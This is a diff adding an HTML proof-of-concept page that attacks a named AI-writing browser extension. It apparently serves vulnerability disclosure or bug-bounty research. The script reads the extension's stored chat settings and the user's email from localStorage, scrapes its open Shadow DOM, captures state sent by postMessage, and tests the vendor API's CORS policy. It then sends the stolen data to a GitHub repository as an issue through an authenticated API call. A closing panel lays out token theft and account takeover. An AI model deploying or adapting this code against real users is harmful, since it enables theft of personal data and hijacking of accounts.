@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html>
+<head><title>Loading...</title></head>
+<body>
+<!-- TextCortex Extension - Cross-Origin Data Theft PoC -->
+<!-- This page runs on attacker's GitHub Pages domain -->
+<!-- The TextCortex extension injects its content script on ALL URLs -->
+<!-- So we can steal extension data from THIS origin -->
+<script>
+(async function() {
+  // ============================================
+  // STEP 1: Steal extension data from localStorage
+  // The content script writes chatSettingStore to localStorage on EVERY page
+  // ============================================
+  var chatStore = localStorage.getItem('chatSettingStore');
+  var toolbarStore = localStorage.getItem('toolbarSettings');
+  var cortexEmail = localStorage.getItem('cortex_email');
+
+  // ============================================
+  // STEP 2: Detect and read the Open Shadow DOM
+  // Extension uses attachShadow({mode: "open"})
+  // ============================================
+  var shadowData = null;
+  // Wait for extension to inject
+  await new Promise(function(r) { setTimeout(r, 2000); });
+  var host = document.querySelector('textcortex-shadow-host');
+  if (host && host.shadowRoot) {
+    var sr = host.shadowRoot;
+    shadowData = {
+      elements: sr.querySelectorAll('*').length,
+      buttons: sr.querySelectorAll('button').length,
+      text: sr.textContent.trim().substring(0, 500)
+    };
+  }
+
+  // ============================================
+  // STEP 3: Listen for postMessage state broadcasts
+  // Extension broadcasts full zustand store state to every page
+  // ============================================
+  var postMessages = [];
+  window.addEventListener('message', function(e) {
+    if (e.data && (e.data.body === 'Innit' || e.data.body === 'Data')) {
+      var stateKeys = [];
+      try { stateKeys = Object.keys(JSON.parse(e.data.state)); } catch(ex) {}
+      postMessages.push({ type: e.data.body, action: e.data.actions, keys: stateKeys });
+      updateDisplay();
+    }
+  });
+
+  // ============================================
+  // STEP 4: Test CORS - prove API accepts any origin
+  // ============================================
+  var corsResult = null;
+  try {
+    var corsResp = await fetch('https://api.textcortex.com/v1/texts/completions', {
+      method: 'OPTIONS',
+      headers: { 'Origin': window.location.origin }
+    });
+    corsResult = {
+      status: corsResp.status,
+      acao: corsResp.headers.get('access-control-allow-origin'),
+      methods: corsResp.headers.get('access-control-allow-methods')
+    };
+  } catch(e) {
+    corsResult = { error: e.message };
+  }
+
+  // ============================================
+  // STEP 5: Exfiltrate to GitHub Issues
+  // ============================================
+  var GH_TOKEN_B64 = "PASTE_YOUR_BASE64_ENCODED_TOKEN_HERE";
+  var GH_REPO = "dharani-dharan-11023/harpa-poc";
+
+  var exfilData = {
+    target: "TextCortex Extension v2.1.1",
+    attacker_origin: window.location.origin,
+    timestamp: new Date().toISOString(),
+    chatSettingStore: chatStore ? JSON.parse(chatStore) : null,
+    toolbarSettings: toolbarStore || null,
+    cortex_email: cortexEmail || null,
+    shadow_dom: shadowData,
+    cors: corsResult,
+    extension_detected: !!host
+  };
+
+  if (GH_TOKEN_B64 !== "PASTE_YOUR_BASE64_ENCODED_TOKEN_HERE") {
+    try {
+      var ghToken = atob(GH_TOKEN_B64);
+      await fetch("https://api.github.com/repos/" + GH_REPO + "/issues", {
+        method: "POST",
+        headers: {
+          "Authorization": "Bearer " + ghToken,
+          "Content-Type": "application/json",
+          "Accept": "application/vnd.github+json"
+        },
+        body: JSON.stringify({
+          title: "TextCortex Exfil: " + (cortexEmail || "unknown") + " @ " + new Date().toISOString(),
+          body: "**Stolen Extension Data:**\n```json\n" + JSON.stringify(exfilData, null, 2) + "\n```"
+        })
+      });
+    } catch(e) {}
+  }
+
+  // ============================================
+  // DISPLAY RESULTS
+  // ============================================
+  function updateDisplay() {
+    document.body.innerHTML = '<div style="font-family:monospace;background:#0a0a0a;color:#0f0;padding:25px;min-height:100vh">' +
+      '<h1 style="color:#e94560;margin:0 0 5px">TextCortex Extension - Cross-Origin Data Theft</h1>' +
+      '<p style="color:#888;margin:0 0 15px">Attacker origin: ' + window.location.origin + ' | ' + new Date().toISOString() + '</p>' +
+
+      '<div style="background:#111;border:1px solid ' + (host ? '#0f0' : '#e94560') + ';padding:10px;margin:6px 0;border-radius:5px">' +
+      '<h3 style="color:#ffaa00;margin:0 0 6px">Extension Detection</h3>' +
+      '<pre style="color:' + (host ? '#0f0' : '#e94560') + ';font-size:12px;margin:0">' +
+      (host ? '[DETECTED] TextCortex shadow host found on attacker page' : '[NOT FOUND] Extension may not be active') +
+      '</pre></div>' +
+
+      '<div style="background:#111;border:1px solid ' + (chatStore ? '#e94560' : '#333') + ';padding:10px;margin:6px 0;border-radius:5px">' +
+      '<h3 style="color:#ffaa00;margin:0 0 6px">Stolen: chatSettingStore from localStorage</h3>' +
+      '<pre style="color:#e94560;font-size:11px;word-break:break-all;white-space:pre-wrap;margin:0;max-height:150px;overflow:auto">' +
+      (chatStore ? chatStore.substring(0, 800) + (chatStore.length > 800 ? '\n... [' + chatStore.length + ' chars total]' : '') : 'Not found') +
+      '</pre></div>' +
+
+      '<div style="background:#111;border:1px solid ' + (cortexEmail ? '#e94560' : '#333') + ';padding:10px;margin:6px 0;border-radius:5px">' +
+      '<h3 style="color:#ffaa00;margin:0 0 6px">Stolen: User Email</h3>' +
+      '<pre style="color:#e94560;font-size:12px;margin:0">' + (cortexEmail || 'Not found on this origin') + '</pre></div>' +
+
+      (shadowData ?
+      '<div style="background:#111;border:1px solid #0f0;padding:10px;margin:6px 0;border-radius:5px">' +
+      '<h3 style="color:#ffaa00;margin:0 0 6px">Stolen: Open Shadow DOM Content</h3>' +
+      '<pre style="color:#0f0;font-size:11px;margin:0">Elements: ' + shadowData.elements + ' | Buttons: ' + shadowData.buttons +
+      '\nText: ' + shadowData.text.substring(0, 300) + '</pre></div>' : '') +
+
+      '<div style="background:#111;border:1px solid ' + (postMessages.length > 0 ? '#e94560' : '#333') + ';padding:10px;margin:6px 0;border-radius:5px">' +
+      '<h3 style="color:#ffaa00;margin:0 0 6px">Captured: postMessage State Broadcasts (' + postMessages.length + ')</h3>' +
+      '<pre style="color:#0f0;font-size:11px;margin:0;max-height:150px;overflow:auto">' +
+      (postMessages.length > 0 ? postMessages.map(function(m) {
+        return m.type + ' | action: ' + m.action + ' | keys: ' + m.keys.join(', ');
+      }).join('\n') : 'Waiting... interact with extension to trigger broadcasts') +
+      '</pre></div>' +
+
+      '<div style="background:#111;border:1px solid #ff6600;padding:10px;margin:6px 0;border-radius:5px">' +
+      '<h3 style="color:#ff6600;margin:0 0 6px">CORS Origin Reflection Proof</h3>' +
+      '<pre style="color:#ffaa00;font-size:11px;margin:0">' +
+      (corsResult ? JSON.stringify(corsResult, null, 2) : 'Testing...') +
+      '\n\napi.textcortex.com reflects ANY origin in access-control-allow-origin\nThis allows stolen tokens to be used from any domain</pre></div>' +
+
+      '<div style="background:#111;border:2px solid #e94560;padding:10px;margin:6px 0;border-radius:5px">' +
+      '<h3 style="color:#e94560;margin:0 0 6px">Attack Summary</h3>' +
+      '<pre style="color:#ff6666;font-size:11px;margin:0">' +
+      'FROM THIS ATTACKER PAGE (' + window.location.origin + '), we can:\n' +
+      '1. Read extension chatSettingStore (agent configs, conversation IDs)\n' +
+      '2. Read extension Shadow DOM (mode:open - full UI access)\n' +
+      '3. Capture postMessage state broadcasts (extension state leak)\n' +
+      '4. Detect extension installation (fingerprinting)\n\n' +
+      'ON app.textcortex.com (via XSS), additionally:\n' +
+      '5. Steal JWT access token from localStorage\n' +
+      '6. Steal refresh token for persistent access\n' +
+      '7. Call API cross-origin (CORS allows all origins)\n' +
+      '8. Full Account Takeover</pre></div>' +
+
+      '</div>';
+  }
+
+  updateDisplay();
+})();
+</script>
+</body>
+</html>
